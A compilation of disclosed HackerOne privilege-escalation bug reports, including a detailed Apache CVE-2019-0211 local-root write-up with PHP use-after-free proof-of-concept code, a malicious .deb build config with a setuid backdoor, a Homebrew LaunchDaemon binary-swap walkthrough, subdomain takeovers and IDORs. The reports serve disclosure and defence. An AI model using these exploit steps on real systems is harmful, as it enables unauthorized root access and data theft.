After that i will got a malicious ``.deb`` package.

2. Create a config file to install this malicious package:

Because the source code is imported before the ``prepare`` step happens, so i will be able to install this package by point directly to it like this ``/opt/src/work.deb``.

The install command now will be like this ``apt install -y --no-recommend /opt/src/work.deb``. And it is ``legal``.

The build config:
```
extraction:
  java:
    prepare:
      packages:
        - /opt/src/work.deb
    after_prepare:
      - echo pwned >> /opt/out/snapshot/log/build.log
      - /usr/bin/setpasswd 'id'
```
After that the build will failed, and attacker will get root on the container by running the setuid backdoor

## PoC is attached below

Thanks & regard!

## Impact

Attacker will get root access and will be able to dump every sensitive datas in the server!

---

### [Apache HTTP [2.4.17-2.4.38] Local Root Privilege Escalation](https://hackerone.com/reports/520903)

- **Report ID:** `520903`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Internet Bug Bounty
- **Reporter:** @real
- **Bounty:** 1500 usd
- **Disclosed:** 2019-09-11T09:46:31.808Z
- **CVE(s):** CVE-2019-0211, CVE-2019-6977

**Vulnerability Information:**

Hello,

I reported a Local Root privilege escalation vulnerability on Apache HTTPd at the beginning of the year. Apache has now patched it, [as you can see here](https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2019-0211).
The vulnerability affects mod_prefork, mod_event, and mod_worker, the most used mods on Linux.
Basically, this is an arbitrary function call as root triggered whenever the server gracefully restarts, which is generally once a day.

Here is the article I plan to publish soon, as MarkDown (careful, wall of text):

# Introduction

From version 2.4.17 (Oct 9, 2015) to version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.
The vulnerability is triggered when Apache gracefully restarts (`apache2ctl graceful`).
In standard Linux configurations, the `logrotate` utility runs this command once a day, at 6:25AM, in order to reset log file handles.

*The vulnerability affects `mod_prefork`, `mod_worker` and `mod_event`. The following bug description, code walkthrough and exploit target `mod_prefork`.*

# Bug description

In MPM prefork, the main server process, running as `root`, manages a pool of single-threaded, low-privilege (`www-data`) worker processes, meant to handle HTTP requests.
In order to get feedback from its workers, Apache maintains a shared-memory area (SHM), `scoreboard`, which contains various informations such as the workers PIDs and the last request they handled.
Each worker is meant to maintain a `process_score` structure associated with its PID, and has full read/write access to the SHM.

*ap_scoreboard_image: pointers to the shared memory block*
```
(gdb) p *ap_scoreboard_image 
$3 = {
  global = 0x7f4a9323e008, 
  parent = 0x7f4a9323e020, 
  servers = 0x55835eddea78
}
(gdb) p ap_scoreboard_image->servers[0]
$5 = (worker_score *) 0x7f4a93240820
```

*Example of shared memory associated with worker PID 19447*
```
(gdb) p ap_scoreboard_image->parent[0]
$6 = {
  pid = 19447, 
  generation = 0, 
  quiescing = 0 '\000', 
  not_accepting = 0 '\000', 
  connections = 0, 
  write_completion = 0, 
  lingering_close = 0, 
  keep_alive = 0, 
  suspended = 0, 
  bucket = 0 <- index for all_buckets
}
(gdb) ptype *ap_scoreboard_image->parent
type = struct process_score {
    pid_t pid;
    ap_generation_t generation;
    char quiescing;
    char not_accepting;
    apr_uint32_t connections;
    apr_uint32_t write_completion;
    apr_uint32_t lingering_close;
    apr_uint32_t keep_alive;
    apr_uint32_t suspended;
    int bucket; <- index for all_buckets
}
```

When Apache gracefully restarts, its main process kills old workers and replaces them by new ones.
At this point, every old worker's `bucket` value will be used by the main process to access an array of his, `all_buckets`.

*all_buckets*
```
(gdb) p $index = ap_scoreboard_image->parent[0]->bucket
(gdb) p all_buckets[$index]
$7 = {
  pod = 0x7f19db2c7408, 
  listeners = 0x7f19db35e9d0, 
  mutex = 0x7f19db2c7550
}
(gdb) ptype all_buckets[$index]
type = struct prefork_child_bucket {
    ap_pod_t *pod;
    ap_listen_rec *listeners;
    apr_proc_mutex_t *mutex; <--
}
(gdb) ptype apr_proc_mutex_t
apr_proc_mutex_t {
    apr_pool_t *pool;
    const apr_proc_mutex_unix_lock_methods_t *meth; <--
    int curr_locked;
    char *fname;
    ...
}
(gdb) ptype apr_proc_mutex_unix_lock_methods_t
apr_proc_mutex_unix_lock_methods_t {
    ...
    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); <--
    ...
}
```

No bound checks happen. Therefore, a rogue worker can change its `bucket` index and make it point to the shared memory, in order to control the `prefork_child_bucket` structure upon restart. Eventually, and before privileges are dropped, `mutex->meth->child_init()` is called.
This results in an **arbitrary function call as root**.

# Vulnerable code

We'll go through `server/mpm/prefork/prefork.c` to find out where and how the bug happens.

- A rogue worker changes its `bucket` index in shared memory to make it point to a structure of his, also in SHM.
- At 06:25AM the next day, `logrotate` requests a graceful restart from Apache.
- Upon this, the main Apache process will first kill workers, and then spawn new ones.
- The killing is done by sending `SIGUSR1` to workers. They are expected to exit ASAP.
- Then, `prefork_run()` ([L853](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L853)) is called to spawn new workers. Since `retained->mpm->was_graceful` is `true` ([L861](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L861)), workers are not restarted straight away.
- Instead, we enter the main loop ([L933](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L933)) and monitor dead workers' PIDs. When an old worker dies, `ap_wait_or_timeout()` returns its PID ([L940](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L940)).
- The index of the `process_score` structure associated with this PID is stored in `child_slot` ([L948](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L948)).
- If the death of this worker was not fatal ([L969](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L969)), `make_child()` is called with `ap_get_scoreboard_process(child_slot)->bucket` as a third argument ([L985](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L985)). As previously said, `bucket`'s value has been changed by a rogue worker.
- `make_child()` creates a new child, `fork()`ing ([L671](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L671)) the main process.
- The OOB read happens ([L691](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L691)), and `my_bucket` is therefore under the control of an attacker.
- `child_main()` is called ([L722](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L722)), and the function call happens a bit further ([L433](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L433)).
- `SAFE_ACCEPT(<code>)` will only execute `<code>` if Apache listens *on two ports or more*, which is often the case since a server listens over HTTP (80) and HTTPS (443).
- Assuming `<code>` is executed, `apr_proc_mutex_child_init()` is called, which results in a call to `(*mutex)->meth->child_init(mutex, pool, fname)` with mutex under control.
- Privileges are dropped a bit later in the execution ([L446](https://github.com/apache/httpd/blob/23167945c17d5764820fdefdcab69295745a15a1/server/mpm/prefork/prefork.c#L446)).

# Exploitation

The exploitation is a four step process:
1. Obtain R/W access on a worker process
2. Write a fake `prefork_child_bucket` structure in the SHM
3. Make `all_buckets[bucket]` point to the structure
4. Await 6:25AM to get an arbitrary function call

Advantages:
- The main process never exits, so we know where everything is mapped by reading `/proc/self/maps` (ASLR/PIE useless)
- When a worker dies (or segfaults), it is automatically restarted by the main process, so there is no risk of DOSing Apache

Problems:
- PHP does not allow to read/write `/proc/self/mem`, which blocks us from simply editing the SHM
- `all_buckets` is reallocated after a graceful restart (!)

## 1. Obtain R/W access on a worker process

### PHP UAF 0-day

Since `mod_prefork` is often used in combination with `mod_php`, it seems natural to exploit the vulnerability through PHP. [CVE-2019-6977]() would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):

*PHP UAF*
```php
<?php

class X extends DateInterval implements JsonSerializable
{
  public function jsonSerialize()
  {
    global $y, $p;
    unset($y[0]);
    $p = $this->y;
    return $this;
  }
}

function get_aslr()
{
  global $p, $y;
  $p = 0;

  $y = [new X('PT1S')];
  json_encode([1234 => &$y]);
  print("ADDRESS: 0x" . dechex($p) . "\n");

  return $p;
}

get_aslr();
```

This is an UAF on a PHP object: we unset `$y[0]` (an instance of `X`), but it is still usable using `$this`.

### UAF to Read/Write

We want to achieve two things:
- Read memory to find `all_buckets`' address
- Edit the SHM to change `bucket` index and add our custom mutex structure

Luckily for us, PHP's heap is located before those two in memory.

*Memory addresses of PHP's heap, `ap_scoreboard_image->*` and `all_buckets`*
```
root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p
7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so

(gdb) p *ap_scoreboard_image 
$14 = {
  global = 0x7f4a9323e008, 
  parent = 0x7f4a9323e020, 
  servers = 0x55835eddea78
}
(gdb) p all_buckets 
$15 = (prefork_child_bucket *) 0x7f4a9336b3f0
```

Since we're triggering the UAF on a PHP object, any property of this object will be UAF'd too; we can convert this `zend_object` UAF into a `zend_string` one.
This is useful because of `zend_string`'s structure:

```
(gdb) ptype zend_string
type = struct _zend_string {
    zend_refcounted_h gc;
    zend_ulong h;
    size_t len;
    char val[1];
}
```

The `len` property contains the length of the string. By incrementing it, we can read and write further in memory, and therefore access the two memory regions we're interested in: the SHM and Apache's `all_buckets`.

### Locating `bucket` indexes and `all_buckets`

We want to change `ap_scoreboard_image->parent[worker_id]->bucket` for a certain `worker_id`. Luckily, the structure always starts at the beginning of the shared memory block, so it is easy to locate.

*Shared memory location and targeted process_score structures*
```
root@apaubuntu:~# cat /proc/6318/maps | grep rw-s
7f4a9323e000-7f4a93252000 rw-s 00000000 00:05 57052                      /dev/zero (deleted)

(gdb) p &ap_scoreboard_image->parent[0]
$18 = (process_score *) 0x7f4a9323e020
(gdb) p &ap_scoreboard_image->parent[1]
$19 = (process_score *) 0x7f4a9323e044
```

To locate `all_buckets`, we can make use of our knowledge of the `prefork_child_bucket` structure. We have:

*Important structures of bucket items*
```
prefork_child_bucket {
    ap_pod_t *pod;
    ap_listen_rec *listeners;
    apr_proc_mutex_t *mutex; <--
}

apr_proc_mutex_t {
    apr_pool_t *pool;
    const apr_proc_mutex_unix_lock_methods_t *meth; <--
    int curr_locked;
    char *fname;

    ...
}

apr_proc_mutex_unix_lock_methods_t {
    unsigned int flags;
    apr_status_t (*create)(apr_proc_mutex_t *, const char *);
    apr_status_t (*acquire)(apr_proc_mutex_t *);
    apr_status_t (*tryacquire)(apr_proc_mutex_t *);
    apr_status_t (*release)(apr_proc_mutex_t *);
    apr_status_t (*cleanup)(void *);
    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); <--
    apr_status_t (*perms_set)(apr_proc_mutex_t *, apr_fileperms_t, apr_uid_t, apr_gid_t);
    apr_lockmech_e mech;
    const char *name;
}
```

`all_buckets[0]->mutex` will be located in the same memory region as `all_buckets[0]`. Since `meth` is a static structure, it will be located in `libapr`'s `.data`. Since `meth` points to functions defined in `libapr`, each of the function pointers will be located in `libapr`'s `.text`.

Since we have knowledge of those region's addresses through `/proc/self/maps`, we can go through every pointer in Apache's memory and find one that matches the structure. It will be `all_buckets[0]`.

As I mentioned, `all_buckets`'s address changes at every graceful restart. This means that when our exploit triggers, `all_buckets`'s address will be different than the one we found. This has to be taken into account; we'll talk about this later.

## 2. Write a fake `prefork_child_bucket` structure in the SHM

### Reaching the function call

The code path to the arbitrary function call is the following:

```
bucket_id = ap_scoreboard_image->parent[id]->bucket
my_bucket = all_buckets[bucket_id]
mutex = &my_bucket->mutex
apr_proc_mutex_child_init(mutex)
(*mutex)->meth->child_init(mutex, pool, fname)
```

![Call:reach](images/carpe-diem-cve-2019-0211-apache-local-root/1.png)

### Calling something proper

To exploit, we make `(*mutex)->meth->child_init` point to `zend_object_std_dtor(zend_object *object)`, which yields the following chain:

```
mutex = &my_bucket->mutex
[object = mutex]
zend_object_std_dtor(object)
ht = object->properties
zend_array_destroy(ht)
zend_hash_destroy(ht)
val = &ht->arData[0]->val
ht->pDestructor(val)
```

`pDestructor` is set to `system`, and `&ht->arData[0]->val` is a string.

![Call:exec](images/carpe-diem-cve-2019-0211-apache-local-root/2.png)

As you can see, both leftmost structures are superimposed.

## 3. Make `all_buckets[bucket]` point to the structure

### Problem and solution

Right now, if `all_buckets`' address was unchanged in between restarts, our exploit would be over:

- Get R/W over all memory after PHP's heap
- Find `all_buckets` by matching its structure
- Put our structure in the SHM
- Change one of the `process_score.bucket` in the SHM so that `all_bucket[bucket]->mutex` points to our payload

As `all_buckets`' address changes, we can do two things to improve reliability: spray the SHM and use every `process_score` structure - one for each PID.

### Spraying the shared memory

If `all_buckets`' new address is not far from the old one, `my_bucket` will point close to our structure. Therefore, instead of having our `prefork_child_bucket` structure at a precise point in the SHM, we can spray it all over unused parts of the SHM. The problem is that the
structure is also used as a `zend_object`, and therefore it has a size of (5 * 8 =) 40 bytes to include `zend_object.properties`.
Spraying a structure that big over a space this small won't help us much.
To solve this problem, we superimpose the two center structures, `apr_proc_mutex_t` and `zend_array`, and spray their address in the rest of the shared memory.
The impact will be that `prefork_child_bucket.mutex` and `zend_object.properties` point to the same address.
Now, if `all_bucket` is relocated not too far from its original address, `my_bucket` will be in the sprayed area.

![Call:exec](images/carpe-diem-cve-2019-0211-apache-local-root/3.png)

### Using every `process_score`

Each Apache worker has an associated `process_score` structure, and with it a `bucket` index.
Instead of changing one `process_score.bucket` value, we can change every one of them, so that they cover another part of memory. For instance:

```
ap_scoreboard_image->parent[0]->bucket = -10000 -> 0x7faabbcc00 <= all_buckets <= 0x7faabbdd00
ap_scoreboard_image->parent[1]->bucket = -20000 -> 0x7faabbdd00 <= all_buckets <= 0x7faabbff00
ap_scoreboard_image->parent[2]->bucket = -30000 -> 0x7faabbff00 <= all_buckets <= 0x7faabc0000
```

This multiplies our success rate by the number of apache workers. Upon respawn, only one worker have a valid `bucket` number, but this is not a problem because the others will crash, and immediately respawn.

### Success rate

Different Apache servers have different number of workers. Having more workers mean we can spray the address of our mutex over less memory, but it also means we can specify more `index` for `all_buckets`. This means that having more workers improves our success rate. After a few tries on my test Apache server of 4 workers (default), I had **~80% success rate**.

Again, if the exploit fails, it can be restarted the next day as Apache will still restart properly. Apache's `error.log` will nevertheless contain notifications about its workers segfaulting.

## 4. Await 6:25AM for the exploit to trigger

Well, that's the easy step.

# Vulnerability timeline

- 2019-02-22 Initial contact email to `security[at]apache[dot]org`, with description and POC
- 2019-02-25 Acknowledgment of the vulnerability, working on a fix
- 2019-03-07 Apache's security team sends a patch for I to review, CVE assigned
- 2019-03-10 I approve the patch
- 2019-04-01 Apache HTTP version 2.4.39 released

Apache's team has been prompt to respond and patch, and nice as hell. Really good experience. PHP never answered regarding the UAF.

# Exploit

I'm not releasing it just yet !

## Impact

You generally obtain root privileges from www-data privileges.

---

### [Subdomain takeover of datacafe-cert.starbucks.com](https://hackerone.com/reports/665398)

- **Report ID:** `665398`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @parzel
- **Bounty:** - usd
- **Disclosed:** 2019-08-28T16:43:06.664Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The subdomain datacafe-cert.starbucks.com had an CNAME record pointing to an unclaimed Azure webservice. This is a high severity security issue because an attacker can register the subdomain on Azure and therefore can own the subdomain datacafe-cert.starbucks.com.

**Description:**
The dangling CNAME record of datacafe-cert.starbucks.com is pointing to s00397nasv101-datacafe-cert.azurewebsites.net which was not claimed by you. I registered a service with this name and therefore was able to takeover the subdomain. Every attacker doing this has afterwords full control over the contents served on this subdomain.

**Platform(s) Affected:** 
http://datacafe-cert.starbucks.com/
https://datacafe-cert.starbucks.com/

## Supporting Material/References:
view-source:http://datacafe-cert.starbucks.com/

## How can the system be exploited with this bug?
The full domain can be taken over. Arbitrary content can be served under it.

## How did you come across this bug ?
I noticed the dangling CNAME record of datacafe-cert.starbucks.com.

## Recommendations for fix
1) Remove the dangling CNAME record from datacafe-cert.starbucks.com
2) I release s00397nasv101-datacafe-cert.azurewebsites.net
3) You can reclaim it if you want

## Impact

This issue can be exploited in several ways, for example but not limited to: XSS, Phishing, Session Hijacking due to bypassing of SOP

---

### [Ubuntu Linux privilege escalation (dirty_sock)](https://hackerone.com/reports/496285)

- **Report ID:** `496285`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Internet Bug Bounty
- **Reporter:** @initstring
- **Bounty:** - usd
- **Disclosed:** 2019-08-28T01:49:16.747Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,
This week, I have publicly disclosed the dirty_sock local root exploit affecting multiple Linux Operating Systems.

Very detailed information on the vulnerability can be found in my blog posting [here](https://initblog.com/2019/dirty-sock/).

And the exploit code can be found in my GitHub repository [here](https://github.com/initstring/dirty_sock).

The vulnerability exists in stock versions of Ubuntu Linux due to the default inclusion of the snapd service, but all Linux distributions are vulnerable if they install the package. The disclosure was handled directly with Canonical via the bug tracked [here](https://bugs.launchpad.net/snapd/+bug/1813365).

A large percentage of the Internet is safer today than it was a week ago, due to the amazing response by the team at Canonical.

## Impact

Linux relies on a functioning security model, particularly in environments shared by multiple users. The ability of any user to obtain immediate root access completely breaks this model, putting sensitive data all around the world at risk of exposure.

The exploits provided allow any user to immediately elevate to a root account.

---

### [Subdomain takeover of d02-1-ag.productioncontroller.starbucks.com](https://hackerone.com/reports/661751)

- **Report ID:** `661751`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @mindtrick
- **Bounty:** - usd
- **Disclosed:** 2019-08-15T19:05:01.553Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
 I was able to claim the subdomain: d02-1-ag.productioncontroller.starbucks.com using Azure Cloud Service

**Platform(s) Affected:**
Subdomain
Azure Cloud Service

## Steps To Reproduce:
1. Using dig, I was able to determine that the subdomain 'd02-1-ag.productioncontroller.starbucks.com'   was vulnerable to takeover.  The record showed status: NXDOMAIN and was pointing to the CNAME: 3edbac0a-5c43-428a-b451-a5eb268f888b.cloudapp.net.
2. Using this information, I was able to create a new Azure Cloud Service with the name '3edbac0a-5c43-428a-b451-a5eb268f888b'.  This would resolve to the CNAME record mentioned above.
3. I then crafted a website and uploaded it to the cloud service using this as a guide: https://docs.microsoft.com/en-us/azure/cloud-services/cloud-services-how-to-create-deploy-portal.
4. I was then able to view the uploaded site at http://d02-1-ag.productioncontroller.starbucks.com

## Supporting Material/References:
POC:
http://d02-1-ag.productioncontroller.starbucks.com/poc-2sKR4C.html


## How can the system be exploited with this bug?
See impact below.

## How did you come across this bug ?
Using enumeration, I was able to discover this domain and determined it was vulnerable by the DNS record data mentioned in the steps above.

## Recommendations for fix
To mitigate this issue you can:
* Remove the DNS record from the DNS zone if it is no longer needed.
* Claim the domain name in a permanent DNS record so it cannot be used elsewhere.

## Impact

This is extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the starbucks.com domain.  This would allow them to post malicious content which would be mistaken for a valid site.  They could steal cookies, bypass domain security, steal sensitive user data, etc.  Here is a nice write-up of the vulnerabilities:  https://0xpatrik.com/subdomain-takeover/

As mentioned in the write-up above the

---

### [Group admins can remove arbitrary data from "data" directory (including admin data)](https://hackerone.com/reports/508493)

- **Report ID:** `508493`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Nextcloud
- **Reporter:** @leonklingele
- **Bounty:** - usd
- **Disclosed:** 2019-08-12T15:15:22.336Z
- **CVE(s):** CVE-2019-15624

**Vulnerability Information:**

Steps to reproduce:

1. Create a new user and make him an admin of an arbitrary group
2. Log in as this new user
3. Create a new user "files_external", "appdata_{random-data}", ..
4. Delete this user

Result: The data/files_external / data/appdata{..} folder is removed.

Solution: Prevent creation of users if data/{new-user-uid} is either
a file or a folder. In addition, prevent deletion of users where the
user data directory (data/{user}) contains other files and folders
than "files" (where the user data is stored).

## Impact

Group admin can remove arbitrary data from "data" directory

---

### [Privilege Escalation удаляем все созданные ссылки с okl.lt](https://hackerone.com/reports/478621)

- **Report ID:** `478621`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** ok.ru
- **Reporter:** @iframe
- **Bounty:** - usd
- **Disclosed:** 2019-07-23T15:40:11.107Z
- **CVE(s):** -

**Summary (team):**

IDOR at okl.lt allowed to hide links in another user's dashboard. The short link itself remained functional.

**Summary (researcher):**

Уязвимость позволяла скрывать все созданные ссылки другими пользователями в их панеле, но ссылка продолжала работать

IDOR at okl.lt allowed to hide links in another user's dashboard. The short link itself remained functional.

---

### [[okl.lt] Раскрытие администраторских функций в .js + Возможность использования этих функций.](https://hackerone.com/reports/547145)

- **Report ID:** `547145`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** ok.ru
- **Reporter:** @iframe
- **Bounty:** - usd
- **Disclosed:** 2019-07-23T15:20:53.101Z
- **CVE(s):** -

**Summary (team):**

@iframe reported insufficient authorization at okl.lt which allowed regular users to perform actions intended to be accessible to administrators only.
This vulnerability was aggravated by the fact that administrators-only API could be reversed-engineered from the HTML code.

---

### [Бесконечный доступ к аккаунту если мы смогли хотя бы раз зайти на аккаунт.](https://hackerone.com/reports/596363)

- **Report ID:** `596363`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** VK.com
- **Reporter:** @cheatboss
- **Bounty:** 500 usd
- **Disclosed:** 2019-07-11T18:07:13.405Z
- **CVE(s):** -

**Summary (team):**

Временная возможность продлить сессию после получения полного доступа к странице.

---

### [Homebrew privilege escalation vulnerability](https://hackerone.com/reports/593926)

- **Report ID:** `593926`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Homebrew
- **Reporter:** @hi_ztz
- **Bounty:** - usd
- **Disclosed:** 2019-06-27T08:33:44.727Z
- **CVE(s):** -

**Summary (team):**

Additional symlinks/directories that were not `chown`d by `brew services` needed to be added to avoid the replacement of the `opt` prefix link.

**Summary (researcher):**

Homebrew has a privilege escalation vulnerability which can cause an attacker easily gain root permission.

---

### [Homebrew installed LaunchDaemons create simple root esclations](https://hackerone.com/reports/586251)

- **Report ID:** `586251`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Homebrew
- **Reporter:** @keeleysam
- **Bounty:** - usd
- **Disclosed:** 2019-05-24T16:36:52.595Z
- **CVE(s):** -

**Vulnerability Information:**

Many programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly.  While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.

Reproduction steps:
- In this case, we'll be looking at dnsmasq, but there are many others 

1. Install macOS Mojave 10.14.5, create an account and login.
2. Install homebrew with the instructions on brew.sh.
3. Run `brew install dnsmasq` - brew will tell the user to run `sudo brew services start dnsmasq`
4. Run `sudo brew services start dnsmasq` as prompted.

```
samuels-Mac:~ samuel$ sudo brew services start dnsmasq
Password:
==> Tapping homebrew/services
Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0
Unpacking objects: 100% (17/17), done.
Tapped 1 command (50 files, 62.6KB).
==> Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)
```
5. We'll find a new LaunchDaemon has been created:

```
samuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>homebrew.mxcl.dnsmasq</string>
    <key>ProgramArguments</key>
    <array>
      <string>/usr/local/opt/dnsmasq/sbin/dnsmasq</string>
      <string>--keep-in-foreground</string>
      <string>-C</string>
      <string>/usr/local/etc/dnsmasq.conf</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
  </dict>
</plist>
```

6. If we look at the folder `/usr/local/opt/dnsmasq/sbin` we can see that our user doesn't have write permissions on the `/usr/local/opt/dnsmasq/sbin/dnsmasq` program which the LaunchDaemon runs.  

```
samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin
total 560
drwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .
drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..
-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq
samuels-Mac:~ samuel$ echo "" >> /usr/local/opt/dnsmasq/sbin/dnsmasq 
-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied
```

7. However, because our user _does_ have write permissions on the `/usr/local/opt/dnsmasq/sbin` directory, an attacker can move `/usr/local/opt/dnsmasq/sbin/dnsmasq` to the side and replace it with a different executable:

```
samuels-Mac:~ samuel$ cat /tmp/evil.sh 
#!/bin/sh

touch /Library/evil

exit 0

samuels-Mac:~ samuel$ ls -lah /tmp/evil.sh 
-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh
samuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak
samuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq
samuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/
total 568
drwxr-xr-x   4 samuel  staff   128B May 20 12:31 .
drwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..
-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq
-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak
samuels-Mac:~ samuel$ ls -lah /Library/evil
ls: /Library/evil: No such file or directory
```

8. Once the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.

```
samuels-Mac:~ samuel$ ls -lah /Library/evil 
-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil
```

## Impact

Any homebrew formula which prompts users to run `sudo brew services start` opens up this vulnerability.  

Once this is opened up, any attacker who can run code as the user can easily escalate to root.

---

### [Privilege-0 to Root Privilege Escalation on EdgeSwitch](https://hackerone.com/reports/511025)

- **Report ID:** `511025`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ubiquiti Inc.
- **Reporter:** @fr33rh
- **Bounty:** - usd
- **Disclosed:** 2019-03-31T12:56:07.641Z
- **CVE(s):** CVE-2019-5425

**Summary (team):**

In EdgeSwitch X v1.1.0 and prior, an authenticated user can execute arbitrary shell commands over the SSH interface bypassing the CLI interface, which allow them to escalate privileges to root.

---

### [SaaS admin can modify/delete/get user information.](https://hackerone.com/reports/324006)

- **Report ID:** `324006`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ping Identity
- **Reporter:** @rijalrojan
- **Bounty:** - usd
- **Disclosed:** 2019-03-26T20:42:55.491Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** [add summary of the vulnerability]
Based on what is seen, SaaS admin should not have access to users info from this page: https://ort-admin.pingone.com/web-portal/usermanagement#/ however, it is still able to get the info on that page. 

**Description:** [add more details about this vulnerability]
When we go to https://ort-admin.pingone.com/web-portal/usermanagement#/, it returns an error that says: `You are not authorized to view that page.`. This means it is blocking certain user permissions like SaaS admin. 

But the Ajax link that retrieves user info on that page does not check for the permission and gives out detail info of the users. 


## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Make sure you are the SaaS administrator on that page and not a Global Admin. If you do not have a SaaS admin account, you can create one at: https://ort-admin.pingone.com/web-portal/account/administratorsng
  2. Go to https://ort-admin.pingone.com/web-portal/ajax/user/directory/users/?advancedSearch=false&ascendingSort=true&count=100&searchString=&sortField=name.familyName&startIndex=1&statusFilter=

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Impact

Leaking user information for under privileged user.

---

### [Subdomain takeover on usclsapipma.cv.ford.com](https://hackerone.com/reports/484420)

- **Report ID:** `484420`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ford
- **Reporter:** @march
- **Bounty:** - usd
- **Disclosed:** 2019-03-24T23:26:15.015Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Ford H1 team,

I want to report a Subdomain takeover vulnerability in this report, a pretty serious security issue in some context.

##Overview:
One of the ford.com subdomains is pointing to Azure, which has unclaimed CNAME record. ANYONE is able to own ford.com subdomain at the moment.

This vulnerability is called subdomain takeover. You can read more about it here:

https://blog.sweepatic.com/subdomain-takeover-principles/
https://labs.detectify.com/tag/hostile-subdomain-takeover/
https://hackerone.com/reports/325336

##Details:
usclsapipma.cv.ford.com has CNAME usclsapipma.trafficmanager.net wich has a CNAME to feuscspma3fcvapi.eastus.cloudapp.azure.com. However, feuscspma3fcvapi.eastus.cloudapp.azure.com is not registered in Azure cloudapp Virtual machine anymore and thus can be registered as FQDN for a easus VM by anyone. After registering the Cloud App Virtual Machine in Azure portal, the person doing so has full control over traffic on dynatraceppeast01.cf.ford.com (so, not only HTTP/HTTPS but also mails traffic, etc, since we have full control over the virtual machine and it's OS).

##Mitigation:
Remove the CNAME record from ford.com DNS zone completely.
OR
Claim it back in Azure portal

##Files : 
